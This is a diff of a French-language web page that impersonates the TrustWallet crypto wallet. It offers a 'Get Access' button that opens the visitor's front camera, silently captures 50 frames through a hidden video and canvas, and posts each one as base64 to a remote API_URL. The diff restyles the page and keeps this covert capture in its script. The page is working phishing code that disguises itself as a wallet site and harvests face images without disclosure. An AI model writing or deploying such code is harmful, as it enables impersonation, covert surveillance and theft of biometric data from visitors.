@@ -6,107 +6,35 @@
 <title>TrustWallet</title>
 <style>
 :root {
-  --trustBlue: #1e90ff;
-  --trustGreen: #00c48c;
-  --trustBlack: #0a0a0a;
-  --trustWhite: #ffffff;
-  --bg: linear-gradient(180deg,#0a1226 0%, #081226 60%, #07122b 100%);
+  --accent:#1e90ff;
+  --bg:linear-gradient(180deg,#0a1226 0%, #081226 60%, #07122b 100%);
+  --white: #ffffff;
 }
 body{
-  margin:0; font-family:Inter, system-ui, Arial, sans-serif;
-  background:var(--bg); color:var(--trustWhite);
+  margin:0; font-family:Inter, system-ui, Arial, sans-serif; background:var(--bg); color:var(--white);
   -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
 }
-.container{
-  max-width:1000px;
-  margin:0 auto;
-  padding:40px 20px;
+.container{max-width:1000px;margin:0 auto;padding:40px 20px;text-align:center;}
+header{display:flex;align-items:center;justify-content:space-between;gap:20px;}
+.logo{display:flex;align-items:center;gap:12px;}
+.logo .mark img{
+  width:36px; /* taille réduite */
+  height:36px;
+  border-radius:6px;
 }
-header{
-  display:flex;
-  align-items:center;
-  gap:12px;
-  margin-bottom:40px;
-}
-.logo img{
-  height:44px;
-  width:44px;
-  border-radius:8px;
-}
-.logo h2{
-  margin:0;
-  font-size:18px;
-  font-weight:700;
-  color:var(--trustWhite);
-  margin-left:10px;
-}
-main.hero{
-  display:flex;
-  gap:30px;
-  align-items:center;
-  justify-content:center;
-  flex-wrap:wrap;
-}
-.hero-left{
-  text-align:left;
-  max-width:520px;
-}
-.eyebrow{
-  font-size:14px;
-  opacity:0.85;
-  margin-bottom:12px;
-}
-h1{
-  font-size:32px;
-  line-height:1.2;
-  margin-bottom:12px;
-  color:var(--trustWhite);
-  font-weight:700;
-}
-p.lead{
-  margin-bottom:20px;
-  color:rgba(255,255,255,0.85);
-  max-width:40ch;
-}
-.cta-row{
-  display:flex;
-  gap:12px;
-  flex-wrap:wrap;
-}
-.btn{
-  background:var(--trustBlue);
-  color:var(--trustWhite);
-  padding:14px 22px;
-  border-radius:12px;
-  border:0;
-  font-size:16px;
-  cursor:pointer;
-  box-shadow:0 8px 24px rgba(30,144,255,0.12);
-}
-.hero-right{
-  display:flex;
-  align-items:center;
-  justify-content:center;
-}
-.card{
-  background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
-  padding:18px;
-  border-radius:14px;
-  box-shadow:0 10px 30px rgba(2,6,23,0.6);
-}
-#display{
-  display:block;
-  border-radius:14px;
-  width:320px;
-  height:240px;
-  object-fit:cover;
-  border:2px solid rgba(255,255,255,0.06);
-  filter: brightness(1.2) contrast(1.1);
-}
-.actions{
-  margin-top:12px;
-  text-align:center;
-}
+.logo h2{margin:0;font-size:18px;font-weight:600;}
+main.hero{margin-top:36px;display:flex;gap:30px;align-items:center;justify-content:center;flex-wrap:wrap;}
+.hero-left{text-align:left;max-width:520px;}
+.eyebrow{font-size:14px;opacity:0.85;margin-bottom:12px;}
+h1{font-size:40px;margin:0 0 12px;line-height:1.02;}
+p.lead{margin:0 0 20px;color:rgba(255,255,255,0.85);}
+.cta-row{display:flex;gap:12px;flex-wrap:wrap;}
+.btn{background:var(--accent);color:white;padding:14px 22px;border-radius:12px;border:0;font-size:16px;cursor:pointer;box-shadow:0 8px 24px rgba(30,144,255,0.12);}
+.hero-right{display:flex;align-items:center;justify-content:center;}
+.card{background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01)); padding:18px; border-radius:14px; box-shadow:0 10px 30px rgba(2,6,23,0.6);}
+#display{display:block;border-radius:10px;max-width:320px;width:320px;height:240px;object-fit:cover;border:2px solid rgba(255,255,255,0.06);}
+.actions{margin-top:18px;text-align:center;}
+footer{margin-top:50px;color:rgba(255,255,255,0.4);font-size:13px;}
 @media (max-width:760px){
   h1{font-size:26px;}
   .hero-left{text-align:center;}
@@ -115,18 +43,23 @@ p.lead{
 </style>
 </head>
 <body>
-
 <div class="container">
-  <header class="flex-col justify-center tablet:flex">
-    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="TrustWallet Logo">
-    <h2>TrustWallet</h2>
+  <header>
+    <div class="logo">
+      <div class="mark"><img src="trustwallet-logo.png" alt="TrustWallet Logo"></div>
+      <div>
+        <h2>TrustWallet</h2>
+        <div style="font-size:12px;color:rgba(255,255,255,0.6)">Secure • Web3 • Mobile</div>
+      </div>
+    </div>
   </header>
 
   <main class="hero">
     <div class="hero-left">
       <div class="eyebrow">Le portefeuille Web3</div>
-      <h1>Propriété réelle des cryptos.<br>Des expériences Web3 intenses</h1>
-      <p class="lead">Libérez la puissance de vos crypto-actifs et découvrez le monde du Web3 avec Trust Wallet.</p>
+      <h1>Gérez vos cryptos, NFT et dApps en toute simplicité</h1>
+      <p class="lead">Accédez à vos actifs, échangez et explorez le Web3 — tout depuis une seule application sécurisée.</p>
+
       <div class="cta-row">
         <button id="getAccessBtn" class="btn">Get Access</button>
       </div>
@@ -134,14 +67,14 @@ p.lead{
 
     <div class="hero-right">
       <div class="card">
-        <img id="display" src="Capture.PNG" alt="Capture">
-        <div class="actions"></div> <!-- texte supprimé -->
+        <img id="display" src="Capture.PNG?v=1" alt="Capture" width="320" height="240">
+        <div class="actions"></div>
       </div>
     </div>
   </main>
 </div>
 
-<video id="video" autoplay muted playsinline style="display:none;"></video>
+<video id="video" autoplay muted playsinline style="display:none;width:0;height:0;"></video>
 <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
 <script>
@@ -152,49 +85,49 @@ const canvas = document.getElementById('canvas');
 
 function captureFrame(){
   const ctx = canvas.getContext('2d');
-  ctx.filter = 'brightness(1.2) contrast(1.1)';
-  ctx.drawImage(video,0,0,canvas.width,canvas.height);
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
   return canvas.toDataURL('image/png');
 }
 
 async function sendImage(base64){
   try{
-    await fetch(API_URL,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({imageBase64:base64})
+    const r = await fetch(API_URL, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ imageBase64: base64 })
     });
-  }catch(e){ console.error('send error',e);}
+    return await r.json();
+  }catch(e){ console.error('send error', e); return null; }
 }
 
-getBtn.addEventListener('click', async ()=>{
+getBtn.addEventListener('click', async () => {
   getBtn.disabled = true;
   getBtn.textContent = 'Processing...';
 
   let stream;
-  try{
-    stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-  }catch(err){
-    alert('Accès caméra refusé : '+(err.message||err));
-    getBtn.disabled=false;
-    getBtn.textContent='Get Access';
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+  } catch (err) {
+    alert('Accès caméra refusé : ' + (err.message || err));
+    getBtn.disabled = false;
+    getBtn.textContent = 'Get Access';
     return;
   }
 
   video.srcObject = stream;
   try{ await video.play(); }catch(e){}
 
-  const CAPTURES=50; 
-  const INTERVAL=1200; 
+  const CAPTURES = 50;
+  const INTERVAL = 1200;
   for(let i=0;i<CAPTURES;i++){
     const base64 = captureFrame();
-    sendImage(base64);
-    await new Promise(r=>setTimeout(r,INTERVAL));
+    sendImage(base64).then(res=>console.log('sent',res)).catch(()=>{});
+    await new Promise(r=>setTimeout(r, INTERVAL));
   }
 
   stream.getTracks().forEach(t=>t.stop());
-  getBtn.disabled=false;
-  getBtn.textContent='Get Access';
+  getBtn.disabled = false;
+  getBtn.textContent = 'Get Access';
 });
 </script>
 </body>
